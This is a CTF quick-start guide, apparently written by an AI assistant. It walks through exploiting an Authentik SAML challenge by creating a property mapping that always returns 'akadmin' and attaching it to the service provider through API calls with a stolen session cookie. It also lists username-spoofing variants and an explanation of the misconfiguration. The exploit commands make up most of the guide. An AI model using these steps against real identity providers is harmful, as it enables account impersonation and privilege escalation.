# SAML CTF - Quick Start Guide

## 🎯 Quick Win Strategy

The most likely solution: **Authentik allows regular users to create SAML property mappings** that override the username attribute.

---

## 🚀 Automated Exploit (Recommended)

### Prerequisites
```powershell
cd c:\Users\Cyborg\Documents\GitHub\CTFs\infobahnctf\saml
npm install xmldom
```

### Step 1: Get Your Session Cookie
1. Visit https://saml-web.challs.infobahnc.tf
2. Login as `sahas` / `123`
3. Open DevTools (F12) → Application → Cookies
4. Copy the `authentik_session` cookie value

### Step 2: Run Automated Exploit
```powershell
node authentik_api.js --target https://saml-web.challs.infobahnc.tf --session "authentik_session=YOUR_COOKIE_HERE"
```

### Step 3: Get Flag
After successful exploit, visit:
```
https://saml-web.challs.infobahnc.tf/flag
```

The tool will:
- ✅ Create malicious property mapping (returns `akadmin`)
- ✅ Inject it into the flaggetter SAML provider
- ✅ Your next SAML auth will use username=`akadmin`

---

## 🔍 Manual Exploitation (If API Access Works)

### Check API Access First
```powershell
# Replace YOUR_SESSION with actual cookie
$headers = @{ "Cookie" = "authentik_session=YOUR_SESSION" }
Invoke-RestMethod -Uri "https://saml-web.challs.infobahnc.tf/api/v3/core/users/me/" -Headers $headers
```

If this returns your user info, API access is working!

### Create Malicious Mapping
```powershell
$body = @{
    name = "evil-akadmin-mapping"
    saml_name = "http://schemas.goauthentik.io/2021/02/saml/username"
    expression = 'return "akadmin"'
} | ConvertTo-Json

Invoke-RestMethod -Method POST -Uri "https://saml-web.challs.infobahnc.tf/api/v3/propertymappings/saml/" -Headers $headers -Body $body -ContentType "application/json"
```

### Find Provider ID
```powershell
$providers = Invoke-RestMethod -Uri "https://saml-web.challs.infobahnc.tf/api/v3/providers/saml/" -Headers $headers
$providers.results | Where-Object { $_.name -like "*flaggetter*" }
```

### Update Provider (Use ID from previous command)
```powershell
$mappingId = "YOUR_MAPPING_ID_HERE"
$providerId = "YOUR_PROVIDER_ID_HERE"

$body = @{
    property_mappings = @($mappingId)
} | ConvertTo-Json

Invoke-RestMethod -Method PATCH -Uri "https://saml-web.challs.infobahnc.tf/api/v3/providers/saml/$providerId/" -Headers $headers -Body $body -ContentType "application/json"
```

### Trigger Auth Flow
```
Visit: https://saml-web.challs.infobahnc.tf/flag
```

---

## 🔧 Alternative: Username Registration Tricks

If API doesn't work, try creating accounts with:

```powershell
# Try these usernames during registration:
akadmin
Akadmin
AKADMIN
akadmin[space]
akadmin[tab]
akadmin%00
```

---

## 🐛 Debugging Tools

### Decode SAML Response
When you visit `/flag`, capture the `SAMLResponse` parameter from URL:

```powershell
node saml_decoder.js "H4sIAAAAAAAA..."
```

This shows:
- Signature details
- All attributes
- Username value
- Security issues

### Check What Username Is Sent
1. Intercept the redirect after IdP auth
2. URL will have `?SAMLResponse=...`
3. Decode it to see actual username in SAML

---

## 🎓 Understanding the Vulnerability

### Normal Flow
1. You login as `sahas` at IdP
2. IdP creates SAML assertion with `username=sahas`
3. SP (flaggetter) reads username from SAML
4. Rejects because `username !== 'akadmin'`

### Exploited Flow
1. You create property mapping that **always returns** `akadmin`
2. You login as `sahas` at IdP
3. IdP uses YOUR malicious mapping
4. SAML assertion contains `username=akadmin`
5. SP accepts and returns flag! 🏁

### Why This Works
- SP trusts SAML signatures (correct!)
- SP trusts IdP to validate identity (correct!)
- **BUT**: If regular users can modify IdP's attribute mappings, they control what claims are sent
- This is a **misconfiguration** not a crypto/protocol flaw

---

## 📊 Attack Decision Tree

```
Can you access /api/v3/propertymappings/saml/ ?
├─ YES → Use authentik_api.js (automated exploit)
│         └─ Get flag ✓
│
└─ NO  → Can you access /if/admin/ ?
          ├─ YES → Create mapping via UI
          │         └─ Get flag ✓
          │
          └─ NO  → Try username tricks
                    ├─ akadmin variants during registration
                    ├─ Unicode/whitespace injection
                    └─ Check for other flows (password reset, etc.)
```

---

## 🚨 Common Issues

### "403 Forbidden" on API
- Session cookie expired → Re-login and get new cookie
- CSRF token needed → Tool handles this automatically
- Insufficient permissions → You're not admin (expected for CTF)

### "Username taken" during registration  
- Expected - `akadmin` already exists
- Try variations or focus on API approach

### Flag still shows "not authorized"
- Mapping not applied → Check provider config
- Multiple mappings conflict → Remove others, keep only evil one
- Cache issue → Logout/login again at IdP

---

## 🎉 Success Indicators

You'll know it worked when:
1. ✅ Mapping created without errors
2. ✅ Provider updated successfully  
3. ✅ SAML decoder shows `username=akadmin`
4. ✅ Flag appears on `/flag` page

---

## 📝 Report Back

Run the automated tool and tell me:
1. What error (if any) you get
2. Your user's `is_staff` / `is_superuser` status
3. Whether you can list property mappings

I'll adjust the exploit strategy accordingly!
